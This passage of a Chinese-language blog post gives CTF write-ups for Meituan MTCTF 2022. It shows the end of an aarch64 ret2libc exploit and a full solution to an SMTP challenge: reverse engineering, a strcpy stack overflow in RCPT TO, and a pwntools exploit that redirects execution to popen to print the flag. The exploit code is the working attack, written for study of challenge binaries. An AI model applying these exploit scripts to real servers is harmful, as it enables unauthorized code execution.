ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">128</span> + <span class="number">8</span>)</span><br><span class="line">p1 += p64(gadgets)</span><br><span class="line">p1 += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">p1 += p64(system_addr)</span><br><span class="line">p1 += p64(<span class="number">0</span>)</span><br><span class="line">p1 += p64(bin_sh)</span><br><span class="line">r.sendlineafter(<span class="string">'&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'sensible&gt;&gt;'</span>, p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="美团MTCTF-2022-smtp-pwn解"><a href="#美团MTCTF-2022-smtp-pwn解" class="headerlink" title="美团MTCTF 2022 smtp pwn解"></a>美团MTCTF 2022 smtp pwn解</h2><p>这是一道协议题，SMTP是一种提供可靠且有效的电子邮件传输的协议。<br>下面是笔者对此题的详细逆向<br><img src="https://img-blog.csdnimg.cn/e4932b73057a4aaa90e13c3863ff0e61.png" alt="在这里插入图片描述"><br>main函数中启用了listerner函数并挂载到了9999端口上，启动pwn文件直接<code>nc 127.0.0.1 9999</code>看一下是否能成功连接上去<br><img src="https://img-blog.csdnimg.cn/e1203b1964e2470b8404b013dae12355.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2cc105fbf1c043828323446464d6d4ec.png" alt="在这里插入图片描述"><br>server端显示了从127.0.0.1这里的连接并开启了一个session worker，并发送给client端220 SMTP tsmtp这条信息，跟进listerner函数<br><img src="https://img-blog.csdnimg.cn/0e0878f8631943a5955f8cec00a7e158.png" alt="在这里插入图片描述"><br>创建了一个创建了一个newthread线程，具体的线程实现是session_worker,arg是session_worker的参数，继续跟进session_worker<br><img src="https://img-blog.csdnimg.cn/78a7bb2cff014929b5fb0de00e429c92.png" alt="在这里插入图片描述"><br>当server检测到连接成功时，会发送220 SMTP tsmtp给client端，和上面运行的一模一样<br><img src="https://img-blog.csdnimg.cn/0c7dda55b9f643adbe938cfea0a4adb5.png" alt="在这里插入图片描述"><br>这一部分就是等待client发送数据到server<br><img src="https://img-blog.csdnimg.cn/3daa99ee0d524186a61471a27c564fd5.png" alt="在这里插入图片描述"><br>上面说到会发送数据到server，如何发送？parse_request里面给出了发送格式，跟进即可<br><img src="https://img-blog.csdnimg.cn/9603a012a858422da2f241eb41e200e8.png" alt="在这里插入图片描述"><br>get_session_command这个函数的名字看起来就像是处理请求格式的，继续跟进<br><img src="https://img-blog.csdnimg.cn/053c00dee4b74676ad9cb26c2a9083ba.png" alt="在这里插入图片描述"><br>s1是server接收client的数据</p>
<blockquote>
<p>检测到HELO会返回0<br>检测到MAIL FROM会返回1<br>检测到RCPT TO:会返回2<br>检测到DATA，会返回3<br>检测到.\r\n会返回4<br>检测到QUIT会返回5</p>
</blockquote>
<p>ptr其实就是这些返回的数字，对应到下面的switch结构<br><img src="https://img-blog.csdnimg.cn/6e45f2dc97ad44dda31290990ca4fa7c.png" alt="在这里插入图片描述"><br>检测到哪一个就会到哪一个分支中进行处理，现在测试一下看一下分析的是否正确<br><img src="https://img-blog.csdnimg.cn/90077da134a943899da3adab30f1c245.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bf4b17d9648c45c3807851a9c7809212.png" alt="在这里插入图片描述"><br>大概率漏洞都发生在这些处理函数中，一个一个分析吧<br><img src="https://img-blog.csdnimg.cn/9f528150666547b581caa01e2d917072.png" alt="在这里插入图片描述"><br>首先是HELO的处理，这里会send<code>250 Ok\n</code>，很正常没有什么漏洞发生<br><img src="https://img-blog.csdnimg.cn/bea8e2de251943eea22a2164b28b9c56.png" alt="在这里插入图片描述"><br>第二个是mail from，也会send <code>250 Ok\n</code>，很正常没什么问题<br><img src="https://img-blog.csdnimg.cn/0d33ec27e2374f0ea4e0d2c67dfb60b6.png" alt="在这里插入图片描述"><br>第三个是rcpt to，成功会send  <code>250 Ok\n</code>，也很正常没什么问题<br><img src="https://img-blog.csdnimg.cn/9a5e3f8a8d734c9eaad20bb80090078e.png" alt="在这里插入图片描述"><br>第四个是data处理，成功会send <code>354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n</code>，提示了使用\r\n.\r\n来结束<br><img src="https://img-blog.csdnimg.cn/c97977429ea4425bba589d93be677d1c.png" alt="在这里插入图片描述"><br>第5个是data结束后的处理，发现这里有个session_submit函数，跟进<br><img src="https://img-blog.csdnimg.cn/460b938fa34a4311b09db535a9578c30.png" alt="在这里插入图片描述"><br>有一个send_worker处理<br><img src="https://img-blog.csdnimg.cn/5eefdf4adcf34afbb7d3428f53fd56d0.png" alt="在这里插入图片描述"><br>会将mail from的信息存在入from中，如果send to的长度大于0xff，会将sendto的数据赋值给s，需要注意的是这个数据我们可控，没有进行大小限制，而s是有大小限制的，所以直接strcpy会造成栈溢出漏洞，成功发现漏洞<br>我们测试一下看一下能否成功crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HELLO()</span><br><span class="line">mailfrom(<span class="string">b'aaaaa'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x200</span></span><br><span class="line">mailto(p1)</span><br><span class="line">data()</span><br><span class="line">eof()</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img-blog.csdnimg.cn/602ca96d6f7947afa28a3f39fe4716a5.png" alt="在这里插入图片描述"><br>可以看到server端成功crash，再看一下保护开启情况，只有一个nx<br>那么如何进行漏洞利用呢？<br>既然，mail from在bss段上，并且可控，send to也可控，那是不是就可以将shellcode放入bss段上，然后控制send to打返回地址到bss段上去执行shellcode<br>直接尝试一下，但是出了一个问题，<code>p1 = b'a' * (0x10c + 4) + b'bbbb'</code>，返回地址虽然被覆盖了但是根本跑不到<br><img src="https://img-blog.csdnimg.cn/3d2019fe776046c2b5ae51bbafeacb81.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/de7b967b46f14c06bd86ef067f396cd1.png" alt="在这里插入图片描述"><br>找到原因了，eax这里的地址是无意义的从而导致了sigsegv，从上面一条指令看到ebp - 0xc，这里很明显就是v3，所以我们需要将v3控制成一个可以成功访问的地址<br>有很多无影响的地址可以用，这里笔者挑了一个<code>0x8049024</code>，<code>p1 = b'a' * 0x100 + p32(0x8049024) + b'a' * 0xc + b'bbbb'</code>再调试一下看一下是否能成功劫持返回地址<br><img src="https://img-blog.csdnimg.cn/135d04d95329469bad0e598f602b5e0d.png" alt="在这里插入图片描述"><br>成功劫持，在bss上放入shellcode，跳转执行<br><img src="https://img-blog.csdnimg.cn/469ab6fe5c49406d9cbeb74565123e5b.png" alt="在这里插入图片描述"><br>笔者到了这一步的时候觉得很无语，直接sigsegv了，在高人的指点下发现了popen函数<br>popen()可以执行shell命令，并读取此命令的返回值；</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{</span><br><span class="line">	popen(<span class="string">"sh"</span>, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>笔者写了一个程序测试了一下，发现直接执行sh命令没有用，笔者用了题目给的docker看了一下，发现bin里只有一点东西<br><img src="https://img-blog.csdnimg.cn/004089c5d957424b8cd397770090ed44.png" alt="在这里插入图片描述"><br>接下来就是如何把flag给带出来，因为直接cat的话是没有回显的，笔者原本想着用wget下载一个木马，然后连上去（哈哈），但是感觉太麻烦了，所以问了些师傅有什么东西可以将cat的东西直接输出到屏幕上，&gt;&amp;1，可以把文件的东西给带出来。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{</span><br><span class="line">	popen(<span class="string">"cat flag&gt;&amp;2"</span>, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>笔者试了&gt;&amp;1, &gt;&amp;2发现的确可以回显，打远程的时候&gt;&amp;5可以回显，exp如下<br>需要注意的是要多打几次，因为有时候edx是无意义的会造成sigsegv，另外r这里需要\x00来截断，不然popen的二参可能不是单纯的r。做这题头大</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">12000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HELLO</span>():</span><br><span class="line">    r.sendline(<span class="string">'HELO'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mailfrom</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendline(<span class="string">b'MAIL FROM:'</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mailto</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendline(<span class="string">b'RCPT TO:'</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data</span>():</span><br><span class="line">    r.sendline(<span class="string">b'DATA'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eof</span>():</span><br><span class="line">    r.sendline(<span class="string">b'.\r\n'</span>)</span><br><span class="line"></span><br><span class="line">popen_plt = elf.plt[<span class="string">'popen'</span>]</span><br><span class="line">bss_addr = <span class="number">0x804d140</span></span><br><span class="line">HELLO()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b'cat flag &gt;&amp;5'</span></span><br><span class="line">mailfrom(shellcode)</span><br><span class="line"></span><br><span class="line">read = elf.search(<span class="string">b'r\x00'</span>).__next__()</span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span> + p32(<span class="number">0x8049024</span>) + <span class="string">b'a'</span> * <span class="number">0xc</span> + p32(popen_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr) + p32(read)</span><br><span class="line">mailto(p1)</span><br><span class="line">data()</span><br><span class="line">eof()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img-blog.csdnimg.cn/38bbcc5377844e6d955eeb03e72ffc18.png" alt="在这里插入图片描述"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2MTCTF-2022-ret2libc-aarch64-pwn%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">美团MTCTF 2022 ret2libc_aarch64 pwn解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp-pwn%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">美团MTCTF 2022 smtp pwn解</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;text=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;is_video=false&amp;description=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解&amp;body=Check out this article: https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;title=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;name=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2022/09/20/%E7%BE%8E%E5%9B%A2MTCTF-2022-smtp%E3%80%81ret2libc-aarch64-pwn%E8%A7%A3/&amp;t=美团MTCTF 2022 smtp、ret2libc_aarch64 pwn解"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2024
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>